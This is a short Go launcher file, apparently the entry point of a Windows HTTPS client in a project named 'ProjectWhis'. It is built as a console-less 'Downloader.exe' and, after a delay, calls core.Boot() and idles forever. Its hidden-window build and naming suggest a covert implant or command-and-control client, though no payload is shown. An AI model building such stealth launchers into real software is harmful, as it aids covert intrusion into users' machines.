//go build -o Downloader.exe -ldflags "-H windowsgui" "C:\main.go"
package main

import (
	"ProjectWhis/Clients/HTTPS/Windows/core"
	"math/rand"
	"os"
	"time"
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func main() {
	if len(os.Args[1:]) > 0 {
		//Case I want it to do something specific... Might remove later
		for {
			time.Sleep(15 * time.Millisecond)
		}
	} else {
		time.Sleep(3 * time.Second)
		core.Boot()
		for {
			time.Sleep(15 * time.Millisecond)
		}
	}
}
